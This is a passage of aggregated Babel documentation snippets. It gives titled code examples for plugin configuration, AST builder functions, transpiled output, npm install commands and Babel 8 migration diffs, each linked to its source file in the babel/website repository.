includes stage-3).\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"presets\": [\"stage-2\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Pure Annotation for ES6 Classes JavaScript\nDESCRIPTION: This code demonstrates the addition of a `/*#__PURE__*/` annotation to transpiled ES6 classes. This annotation allows minifiers like Uglify and babel-minify to perform dead code elimination on unused classes.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_21\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass C {\n  m(x) {\n    return 'a';\n  }\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar C = /*#__PURE__*/ function () {\n  function C() {\n    _classCallCheck(this, C)\n  }\n  C.prototype.m = function m(x) {\n    return 'a';\n  };\n  return C;\n}();\n```\n\n----------------------------------------\n\nTITLE: Class Properties Usage with Babel CLI Shell\nDESCRIPTION: Shows how to enable class property initializers in Babel using the command-line interface (CLI) with the `--optional` or `--stage` flags. It demonstrates two equivalent CLI commands for enabling the feature when transpiling a script.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ babel --optional es7.classProperties script.js\n# or\n$ babel --stage 0 script.js\n```\n\n----------------------------------------\n\nTITLE: Transpiled Arguments Deoptimization Example (JavaScript)\nDESCRIPTION: This is the transpiled output of the arguments deoptimization example using Babel. It highlights the unnecessary loop generated when arguments are shadowed in a nested function, demonstrating the deoptimization.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-08-16-gsoc-karl-1.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar log = function log() {\n  var _console;\n\n  return (_console = console).log.apply(_console, arguments);\n};\n\nfunction test_opt() {\n  log.apply(undefined, arguments);\n}\n\nfunction test_deopt() {\n  for (var _len = arguments.length, args = Array(_len), _key = 0; _key < _len; _key++) { // unnecessary loop\n    args[_key] = arguments[_key];\n  }\n\n  var fn = function fn() {\n    return log.apply(undefined, arguments);\n  };\n  fn.apply(undefined, args);\n}\n```\n\n----------------------------------------\n\nTITLE: Diff: Decimal Proposal Migration\nDESCRIPTION: Shows how to migrate from the old decimal proposal syntax to the new one, removing the decimal plugin and updating the syntax to use Decimal constructor and methods.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n  - 1.03m\n  + new Decimal(\"1.03\")\n  - decimal1 + decimal2\n  + decimal1.add(decimal2)\n```\n\n----------------------------------------\n\nTITLE: Transform typeof Symbol Example - JavaScript\nDESCRIPTION: This snippet shows how the plugin transforms the `typeof Symbol()` expression to ensure compatibility with older JavaScript environments. It replaces the direct `typeof` check with a helper function.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typeof-symbol.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ntypeof Symbol() === \"symbol\";\n```\n\n----------------------------------------\n\nTITLE: JavaScript Module String Names Example\nDESCRIPTION: This example demonstrates the usage of module string names syntax, which is parsed by @babel/parser when the plugin is enabled. It shows exporting a variable with a string literal as the export name. Requires @babel/parser@^7.12.0.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-module-string-names.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport { smile as \"😄\" } from \"./emojis.js\";\n```\n\n----------------------------------------\n\nTITLE: Creating a BindExpression Node\nDESCRIPTION: Creates an AST node representing a bind expression. Requires `object` (an `Expression`) and `callee` (an `Expression`). Use `t.isBindExpression(node, opts)` to check if a node is a BindExpression and `t.assertBindExpression(node, opts)` to assert that a node is a BindExpression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.bindExpression(object, callee);\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin in babel.config.json (JSON)\nDESCRIPTION: Example of how to configure the @babel/plugin-transform-object-super plugin in a babel.config.json file.  This configuration enables the plugin for all files processed by Babel in your project. No external dependencies are explicitly defined in this snippet.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-super.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-object-super\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Template Literals Revision Loose Mode (JavaScript)\nDESCRIPTION: This snippet shows the output in loose mode for template literals with unicode escapes using the `_taggedTemplateLiteralLoose` helper function.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_26\n\nLANGUAGE: javascript\nCODE:\n```\n// loose mode\nfunction _taggedTemplateLiteralLoose(strings, raw) {\n  strings.raw = raw;\n  return strings;\n}\nvar _templateObject = /*#__PURE__*/ _taggedTemplateLiteralLoose(\n  [void 0],\n  [\"\\\\unicode and \\\\u{55}\"]\n);\ntag(_templateObject);\n```\n\n----------------------------------------\n\nTITLE: Add Side Effect Import JavaScript\nDESCRIPTION: Adds a side-effect import statement to the current module. Requires @babel/helper-module-imports. The 'path' argument represents the current path in the AST, and 'source' specifies the module to import from.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-module-imports.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { addSideEffect } from \"@babel/helper-module-imports\";\naddSideEffect(path, 'source');\n```\n\n----------------------------------------\n\nTITLE: Plugin Usage via Node API (JavaScript)\nDESCRIPTION: This code shows how to use the `@babel/plugin-transform-regenerator` plugin via the Babel Node API.  It uses `require('@babel/core').transformSync` to transform the provided code string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regenerator.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-regenerator\"],\n});\n```\n\n----------------------------------------\n\nTITLE: TSImportType Migration Diff\nDESCRIPTION: This diff illustrates how to update code using `t.tsImportType` due to the AST shape change in Babel 8, requiring wrapping the argument string literal within the `tsLiteralType` builder.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_59\n\nLANGUAGE: diff\nCODE:\n```\n  t.tsImportType(\n+   t.tsLiteralType(\n    t.stringLiteral(\"foo\")\n+   )\n  )\n```\n\n----------------------------------------\n\nTITLE: JavaScript __proto__ Example\nDESCRIPTION: Illustrates the basic functionality of the __proto__ property in JavaScript, demonstrating how it allows one object to inherit properties from another. Shows inheritance of 'a' and accessing 'b'.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-proto-to-assign.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = { a: 1 };\nvar bar = { b: 2 };\nbar.__proto__ = foo;\nbar.a; // 1\nbar.b; // 2\n```\n\n----------------------------------------\n\nTITLE: Configuring the Plugin in babel.config.json\nDESCRIPTION: Configures the Babel plugin within the babel.config.json file. This allows Babel to automatically use the plugin when transforming code, enabling the bug fix for V8 spread parameters in optional chaining.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-v8-spread-parameters-in-optional-chaining.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-bugfix-v8-spread-parameters-in-optional-chaining\"]\n}\n```\n\n----------------------------------------\n\nTITLE: TSParenthesizedType Example in TypeScript\nDESCRIPTION: This TypeScript code demonstrates the difference in AST representation of parenthesized types between Babel 7 and Babel 8, depending on the `createParenthesizedExpression` parser option.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_52\n\nLANGUAGE: typescript\nCODE:\n```\ntype T = ({});\n\n// Babel 8 with createParenthesizedExpression: true, and Babel 7\nTSParenthesizedType { typeAnnotation: TSTypeLiteral { members: [] } }\n\n// Babel 8 with createParenthesizedExpression: false\nTSTypeLiteral { members: [] }\n```\n\n----------------------------------------\n\nTITLE: TypeScript 3.4 const Context Example JavaScript\nDESCRIPTION: Demonstrates the use of `const` contexts in TypeScript 3.4 to mark an object as deeply frozen, ensuring immutability.  Requires TypeScript 3.4 or later and the Babel TypeScript plugin.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst student = {\n  name: \"Joe Blogs\",\n  marks: [25, 23, 30]\n} as const;\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example: Numeric Literal Conversion Output\nDESCRIPTION: Shows the output of the Babel plugin converting numeric literals to a minified representation using exponential notation.  The input array [1000, -20000] is transformed into [1e3, -2e4].\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-numeric-literals.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n[1e3, -2e4]\n```\n\n----------------------------------------\n\nTITLE: Config: Babel Plugin Usage (No Options)\nDESCRIPTION: This JSON snippet shows how to enable the babel-plugin-minify-mangle-names plugin in a Babel configuration file without specifying any options. It's a simple way to apply the default mangling behavior.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-mangle-names.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-mangle-names\"]\n}\n```\n\n----------------------------------------\n\nTITLE: OptionalCallExpression TypeParameters Renaming (TypeScript)\nDESCRIPTION: Illustrates the renaming of `typeParameters` to `typeArguments` in OptionalCallExpression.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_35\n\nLANGUAGE: typescript\nCODE:\n```\nfn?.<string>()\n```\n\n----------------------------------------\n\nTITLE: Installation via npm\nDESCRIPTION: Command-line instruction showing how to install the @babel/plugin-transform-classes plugin using npm. The --save-dev flag indicates that it should be installed as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-classes\n```\n\n----------------------------------------\n\nTITLE: Set Computed Properties JavaScript\nDESCRIPTION: This JavaScript code snippet showcases the use of computed properties in an object literal. When the `setComputedProperties` assumption is enabled, Babel assumes that the object doesn't contain properties that overwrite setters defined in the same object. This allows Babel to assign computed properties directly, instead of using `Object.defineProperty`, potentially increasing performance.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_19\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet obj = {\n  set name(value) {},\n  [key]: val\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Babel in AVA Configuration (ava.config.js/package.json)\nDESCRIPTION: This code snippet demonstrates how to enable Babel support within an AVA project by setting the babel option to true in the ava configuration. This configuration can be placed either in the package.json file or in a separate ava.config.js file. AVA will then use Babel to transpile the project's code.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/ava/usage.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"ava\": {\n    \"babel\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript Export Type Star Syntax\nDESCRIPTION: This TypeScript code illustrates the `export type *` syntax introduced in TypeScript 5.0. This syntax simplifies the re-exporting of types from modules, making code more concise and readable, and allows Babel to safely remove the re-export declaration during compilation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-02-20-7.21.0.md#_snippet_7\n\nLANGUAGE: TypeScript\nCODE:\n```\nexport type * from \"./mod\";\nexport type * as ns from \"./mod\";\n```\n\n----------------------------------------\n\nTITLE: Installing the Plugin via npm (Shell)\nDESCRIPTION: This shell command demonstrates how to install the @babel/plugin-transform-numeric-separator plugin as a development dependency using npm. This plugin is required to transform numeric separators.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-numeric-separator.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-numeric-separator\n```\n\n----------------------------------------\n\nTITLE: Limit export node default assignment stack size - JavaScript\nDESCRIPTION: This code demonstrates a fix in `transform-es2015-modules-commonjs` to limit the stack size when exporting a large number of modules.  The solution is to break up the expression into sets of 100.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\nimport { foo, foo1, foo2 ... } from \"foo\"; // assume ... is 100 imports/exports\nexport { foo, foo1, foo2 ... }\n```\n\nLANGUAGE: javascript\nCODE:\n```\nexports.Foo6 = exports.Foo5 = ...\n```\n\nLANGUAGE: javascript\nCODE:\n```\nexports.foo100 = undefined; // split by 100\nexports.foo99 = exports.foo98 = ... exports.foo1 = exports.foo = undefined\n```\n\n----------------------------------------\n\nTITLE: Remove Undefined Returns Example (Out)\nDESCRIPTION: This example shows the output JavaScript code after the `babel-plugin-transform-remove-undefined` plugin is applied. It demonstrates how the plugin removes explicit `undefined` returns and uninitializes variables set to undefined.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-undefined.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet a;\nfunction foo() {\n  var b;\n  return;\n}\n```\n\n----------------------------------------\n\nTITLE: Installing via npm\nDESCRIPTION: Installs the @babel/plugin-bugfix-firefox-class-in-computed-class-key plugin as a development dependency using npm. This command adds the plugin to your project's package.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-firefox-class-in-computed-class-key.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-bugfix-firefox-class-in-computed-class-key\n```\n\n----------------------------------------\n\nTITLE: Handling Qualified Names in TSClassImplements in Babel 8 (TS)\nDESCRIPTION: This snippet demonstrates how qualified names (e.g., `X.Y`) in `implements` clauses are handled in Babel 8. In Babel 7, they were represented as `TSQualifiedName`. In Babel 8, they are parsed as a `MemberExpression`, providing a more standard representation.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_44\n\nLANGUAGE: typescript\nCODE:\n```\nclass C implements X.Y {}\n\n// AST in Babel 7\n{\n  type: \"ClassDeclaration\",\n  id: Identifier(\"C\"),\n  implements: [\n    {\n      type: \"TSExpressionWithTypeArguments\",\n      expression: {\n        type: \"TSQualifiedName\",\n        left: Identifier(\"X\"),\n        right: Identifier(\"Y\")\n      }\n    }\n  ],\n  body: ClassBody([]),\n}\n\n// AST in Babel 8\n{\n  type: \"ClassDeclaration\",\n  id: Identifier(\"C\"),\n  implements: [\n    {\n      type: \"TSClassImplements\",\n      expression: {\n        type: \"MemberExpression\",\n        object: Identifier(\"X\"),\n        property: Identifier(\"Y\"),\n        computed: false\n      }\n    }\n  ],\n  body: ClassBody([]),\n}\n```\n\n----------------------------------------\n\nTITLE: Safari Class Field Bug (JavaScript)\nDESCRIPTION: This code demonstrates a bug in older Safari versions related to parentheses around expressions in class fields. The bug causes an error when parentheses are used around `a` in the class field initializer. This example showcases the problem that `@babel/plugin-bugfix-safari-class-field-initializer-scope` addresses.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-07-26-7.25.0.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  let a = [3];\n  new class {\n    c = (a)[0];\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Preset Env\nDESCRIPTION: This command installs the @babel/preset-env preset as a development dependency using npm or yarn.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/setup.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install @babel/preset-env --save-dev\n```\n\n----------------------------------------\n\nTITLE: Transforming Unicode escapes JavaScript\nDESCRIPTION: This code demonstrates how Babel now supports compiling `\\u{...}`-style Unicode escapes in strings and identifiers by default using `@babel/preset-env`. The first snippet declares and logs a variable using Unicode escapes. The second snippet shows the equivalent legacy syntax after Babel transforms the code.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar \\u{1d49c} = \"\\u{Babe1}\";\nconsole.log(\\u{1d49c});\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypeReference Node in JavaScript\nDESCRIPTION: This snippet illustrates how to create a `TSTypeReference` AST node using Babel's `t.tsTypeReference` method. It accepts a type name (`TSEntityName`) which is required, and optionally a `TSTypeParameterInstantiation`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_220\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypeReference(typeName, typeParameters);\n```\n\n----------------------------------------\n\nTITLE: Transform Undefined to Void: JavaScript Example Output\nDESCRIPTION: This JavaScript code snippet shows the result of transforming `foo === undefined` into `foo === void 0`. The plugin enforces the use of `void 0` for undefined comparison.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-undefined-to-void.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfoo === void 0;\n```\n\n----------------------------------------\n\nTITLE: Creating a Decorator AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.decorator` to create a decorator node in the AST. It takes an expression representing the decorator itself.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_44\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.decorator(expression);\n```\n\n----------------------------------------\n\nTITLE: Use plugin via CLI - Shell\nDESCRIPTION: Runs Babel with the `minify-type-constructors` plugin using the command-line interface.  This command transforms `script.js` using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-type-constructors.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins minify-type-constructors script.js\n```\n\n----------------------------------------\n\nTITLE: Creating EnumBooleanMember in JavaScript\nDESCRIPTION: This snippet demonstrates how to create an `EnumBooleanMember` AST node using Babel's `t.enumBooleanMember` method. The `id` parameter is required and should be an `Identifier` node representing the name of the enum member. This node is used to represent boolean-valued members of an enum.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_52\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.enumBooleanMember(id);\n```\n\n----------------------------------------\n\nTITLE: @babel/traverse NodePath Method Removal - Comparisons\nDESCRIPTION: This code demonstrates the removal of `is`, `isnt`, `has`, and `equals` methods from `NodePath` in `@babel/traverse`.  It provides migration steps, suggesting direct property comparisons on `path.node` instead.  It shows how to check node properties directly rather than using the removed methods. Dependencies: `@babel/traverse`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_72\n\nLANGUAGE: diff\nCODE:\n```\n- functionExpressionPath.equals(\"id\", idNode)\n+ functionExpressionPath.node.id === idNode\n\n- functionExpressionPath.is(\"id\")\n- functionExpressionPath.has(\"id\")\n+ functionExpressionPath.node.id\n\n- functionExpressionPath.has(\"arguments\")\n+ !!functionExpressionPath.node.arguments.length\n\n- functionExpressionPath.isnt(\"async\")\n+ !functionExpressionPath.node.async\n```\n\n----------------------------------------\n\nTITLE: Transform Class Properties Usage (JavaScript)\nDESCRIPTION: This snippet shows the configuration for the `transform-class-properties` plugin with the `spec` option set to true. This configuration enforces the use of `Object.defineProperty` for class properties.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"plugins\": [\n    [\"transform-class-properties\", {\n      \"spec\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Angular Core Package.json Example (Multiple ES Versions)\nDESCRIPTION: This code snippet illustrates how the `@angular/core` package defines multiple entry points for different ES versions using various fields like `module`, `es2015`, `esm5`, `esm2015`, `fesm5`, and `fesm2015`.  This approach allows consumers to select the appropriate version based on their target environment and build tools. However, the document argues that this approach is not scalable for future ES versions.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-06-26-on-consuming-and-publishing-es2015+-packages.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"main\": \"./bundles/core.umd.js\",\n  \"module\": \"./fesm5/core.js\",\n  \"es2015\": \"./fesm2015/core.js\",\n  \"esm5\": \"./esm5/core.js\",\n  \"esm2015\": \"./esm2015/core.js\",\n  \"fesm5\": \"./fesm5/core.js\",\n  \"fesm2015\": \"./fesm2015/core.js\",\n}\n```\n\n----------------------------------------\n\nTITLE: Dead Code Elimination Example - Output\nDESCRIPTION: This JavaScript code showcases the output after running the babel-plugin-minify-dead-code-elimination plugin on the input shown in the previous snippet. Unused variables and the unused function are removed, resulting in a smaller, more efficient code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-dead-code-elimination.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo() {}\nfunction bar() { f(); }\nfunction baz() {\n  console.log(1);\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin (JSON)\nDESCRIPTION: Configures the Babel plugin within a babel.config.json file. This enables the plugin to parse partial application syntax when Babel processes JavaScript files. It requires a babel.config.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-partial-application.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-partial-application\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Compiled ES6 Class with PURE Annotation\nDESCRIPTION: This JavaScript code shows the compiled output of the ES6 class `C` with the `/*#__PURE__*/` annotation. This annotation helps minifiers to identify code that can be safely removed during dead code elimination.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar C =\n/*#__PURE__*/\nfunction () {\n  // ...\n}();\n```\n\n----------------------------------------\n\nTITLE: Export Default From in Babel 7\nDESCRIPTION: Demonstrates the export default from syntax in Babel 7. It allows exporting a default export from another module in a concise manner.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_30\n\nLANGUAGE: javascript\nCODE:\n```\nexport v from \"mod\"\n```\n\n----------------------------------------\n\nTITLE: Fixing for-of replacement inside label (JavaScript)\nDESCRIPTION: This snippet resolves an issue related to replacing for-of loops when they are nested inside labeled statements, ensuring correct code transformation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nif ( true ) {\n  loop: for (let ch of []) {}\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Named Tuple Member\nDESCRIPTION: Creates a TypeScript named tuple member node in the AST. Represents a named element within a tuple type.  Requires a label (identifier) and element type, and accepts an optional flag for marking the member as optional.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_191\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsNamedTupleMember(label, elementType, optional);\n```\n\n----------------------------------------\n\nTITLE: Using babel-preset-minify via CLI\nDESCRIPTION: This shell command demonstrates how to use the 'minify' preset via the Babel CLI. It transforms the 'script.js' file using the specified preset.  Ensure Babel CLI is installed globally or locally.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-minify.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nbabel script.js --presets minify\n```\n\n----------------------------------------\n\nTITLE: Transformed Promise with @babel/runtime-corejs2\nDESCRIPTION: This is the transformed code. The `Promise` is replaced with a `require` call to load the `core-js` implementation via `@babel/runtime-corejs2`. This provides a polyfill without polluting the global scope.\nSOURCE: https://github.com/babel/website/blob/main/docs/runtime-corejs2.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _Promise = require(\"@babel/runtime-corejs2/core-js/promise.js\");\n```\n\n----------------------------------------\n\nTITLE: Install sails-hook-babel as dev dependency (npm)\nDESCRIPTION: This snippet shows how to install the sails-hook-babel package as a development dependency using npm. The --save-dev flag ensures that the package is added to the devDependencies section of the package.json file.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/sails/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev sails-hook-babel\n```\n\n----------------------------------------\n\nTITLE: Smart Pipeline Operator Support in Babel\nDESCRIPTION: This snippet showcases the smart pipeline operator.  The `#` placeholder represents the value passed from the previous pipeline stage. Requires Babel configuration to handle the transformation of the smart pipeline operator.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nnum |> add(2, #) |> double\n```\n\n----------------------------------------\n\nTITLE: String Usage with `.ast` in @babel/template (JavaScript)\nDESCRIPTION: This snippet demonstrates using the `.ast` property of @babel/template to directly parse a string into an AST, useful when no placeholders are needed. Requires @babel/template.\nSOURCE: https://github.com/babel/website/blob/main/docs/template.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst ast = template.ast(`\n  var myModule = require(\"my-module\");\n`);\n```\n\n----------------------------------------\n\nTITLE: Creating an OptionalCallExpression in JavaScript\nDESCRIPTION: This code snippet demonstrates creating an `OptionalCallExpression` AST node using `t.optionalCallExpression(callee, arguments, optional)`.  It represents an optional call expression.  Parameters include the callee, arguments, and an optional flag.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_133\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.optionalCallExpression(callee, arguments, optional);\n```\n\n----------------------------------------\n\nTITLE: CLI Usage\nDESCRIPTION: This command demonstrates how to use the babel-plugin-minify-guarded-expressions plugin via the Babel CLI. It transforms `script.js` using the specified plugin.  Ensure Babel CLI is installed globally or locally in your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-guarded-expressions.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins minify-guarded-expressions script.js\n```\n\n----------------------------------------\n\nTITLE: Unicode Escapes Transformation Example JavaScript\nDESCRIPTION: Demonstrates how the plugin transforms Unicode escapes in ES2015 code to ES5 compatible Unicode characters. The input JavaScript code uses Unicode escapes, and the output shows the equivalent ES5 representation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-escapes.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar \\u{1d49c} = \"\\u{Babe1}\";\n\nconsole.log(\\u{1d49c});\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _ud835_udc9c = \"\\uDAAA\\uDFE1\";\n\nconsole.log(_ud835_udc9c);\n```\n\n----------------------------------------\n\nTITLE: Install @babel/plugin-transform-literals\nDESCRIPTION: This command installs the `@babel/plugin-transform-literals` plugin as a development dependency using npm. It requires npm to be installed. It's used to add the plugin to the project's dependencies so that Babel can use it during the build process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-literals.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-literals\n```\n\n----------------------------------------\n\nTITLE: Excluding super from being assigned to ref variable (JavaScript)\nDESCRIPTION: This snippet excludes the `super` keyword from being assigned to a reference variable, preventing potential errors when using `super` in derived classes or methods.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_20\n\nLANGUAGE: JavaScript\nCODE:\n```\nfoo = {\n  bar() {\n    return super.baz **= 12;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TypeParameterInstantiation with Babel\nDESCRIPTION: Creates a `TypeParameterInstantiation` AST node using the `t.typeParameterInstantiation` method. This node represents a type parameter instantiation in Flow, where `params` is an array of `FlowType` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_240\n\nLANGUAGE: javascript\nCODE:\n```\nt.typeParameterInstantiation(params);\n```\n\n----------------------------------------\n\nTITLE: Configuration File - Assumptions (iterableIsArray)\nDESCRIPTION: This JSON configuration shows how to configure the `iterableIsArray` assumption to control the behavior when spreading arrays, particularly regarding the preservation of \"holes\".\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-spread.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"assumptions\": {\n    \"iterableIsArray\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Class Properties - Output (JavaScript)\nDESCRIPTION: This snippet shows the output JavaScript code after transforming class properties without the `spec` option.  It initializes the `baz` property within the constructor.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar Foo = function Foo() {\n  _classCallCheck(this, Foo);\n  this.baz = 'guy';\n};\n```\n\n----------------------------------------\n\nTITLE: Complex Configuration with Exact Globals JSON\nDESCRIPTION: This JSON shows complex config for external helpers, transform modules umd, globals, and exactGlobals.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_11\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    \"@babel/plugin-external-helpers\",\n    [\n      \"@babel/plugin-transform-modules-umd\",\n      {\n        \"globals\": {\n          \"my/custom/module/name\": \"My.Custom.Module.Name\"\n        },\n        \"exactGlobals\": true\n      }\n    ]\n  ],\n  \"moduleId\": \"my/custom/module/name\"\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Module Declaration\nDESCRIPTION: Creates a TypeScript module declaration node in the AST. Represents a TypeScript module or namespace declaration. Requires an identifier (or string literal) for the module name and a body (either a module block or another module declaration). The `declare` and `global` properties are excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_190\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsModuleDeclaration(id, body);\n```\n\n----------------------------------------\n\nTITLE: Creating a TSEnumBody Node in JavaScript\nDESCRIPTION: This snippet shows how to create a 